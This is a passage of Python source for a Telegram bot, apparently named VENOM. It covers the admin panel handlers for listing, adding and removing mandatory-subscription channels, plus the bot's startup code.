EM_SUB_DEL   = '<tg-emoji emoji-id="6267000941547885720">🗑</tg-emoji>'

def _mandatory_sub_text_and_rows():
    """Build the mandatory sub panel text + keyboard dynamically."""
    channels = load_mandatory_channels()
    if channels:
        ch_lines = "\n".join(
            f"  {i+1}. <a href='{c['url']}'>{html.escape(c.get('title','?'))}</a> — <code>{c['id']}</code>"
            for i, c in enumerate(channels)
        )
        status = f"✅ <b>Active — {len(channels)} channel(s):</b>\n{ch_lines}"
    else:
        status = "❌ <b>Disabled</b> — No channels set"
    text = pe(
        f"{EM_SUB_PANEL} <b>Mandatory Subscription</b>\n"
        f"<b>{SEP}</b>\n"
        f"{status}\n"
        f"<b>{SEP}</b>"
    )
    rows = []
    for c in channels:
        rows.append([{
            "text": f"🗑  Remove: {c.get('title','Channel')}",
            "callback_data": f"rmsub_{c['id']}"
        }])
    rows.append([{"text": f"  Add Channel  ", "callback_data": "addsub_start"}])
    rows.append([{"text": "↪️  Back", "callback_data": "admin_panel"}])
    return text, rows

@bot.on(events.CallbackQuery(pattern=b"admin_mandatory_sub"))
async def cb_admin_mandatory_sub(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    text, rows = _mandatory_sub_text_and_rows()
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, text, rows)

# ─── Inline: Add channel button ────────────────────────────────────────────────
@bot.on(events.CallbackQuery(pattern=b"addsub_start"))
async def cb_addsub_start(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("❌ Admin only!", alert=True); return
    _addsub_state[uid] = {"step": 1}
    await event.answer()
    await bot.send_message(uid, pe(
        f"{EM_SUB_ADD} <b>Add Channel — Step 1/2</b>\n"
        f"<b>{SEP}</b>\n"
        f"Forward any message from the channel you want to add ↓\n\n"
        f"<i>• Make sure the bot is added as admin in the channel\n"
        f"• Send /cancel to abort</i>"
    ), parse_mode='html')

# ─── Inline: Remove channel button ─────────────────────────────────────────────
@bot.on(events.CallbackQuery(pattern=rb"rmsub_(-?\d+)"))
async def cb_rmsub_inline(event):
    uid = event.sender_id
    if not is_admin(uid):
        await event.answer("❌ Admin only!", alert=True); return
    ch_id    = int(event.data.decode().split("rmsub_", 1)[1])
    channels = load_mandatory_channels()
    target   = next((c for c in channels if c['id'] == ch_id), None)
    if not target:
        await event.answer("⚠️ Channel not found!", alert=True); return
    channels = [c for c in channels if c['id'] != ch_id]
    save_mandatory_channels(channels)
    await event.answer(f"✅ Removed: {target.get('title','Channel')}", alert=False)
    text, rows = _mandatory_sub_text_and_rows()
    await nav_edit(event.chat_id, event.message_id, text, rows)

# ══════════════════════════════════════════════════════════════════════════════
# STARTUP
# ══════════════════════════════════════════════════════════════════════════════
import concurrent.futures as _cf
_executor = _cf.ThreadPoolExecutor(max_workers=64)
asyncio.get_event_loop().set_default_executor(_executor)

print(f"[VENOM] Bot starting — Admin: {OWNER_ID}")
_register_commands()
print("[VENOM] Commands registered")
bot.run_until_disconnected()
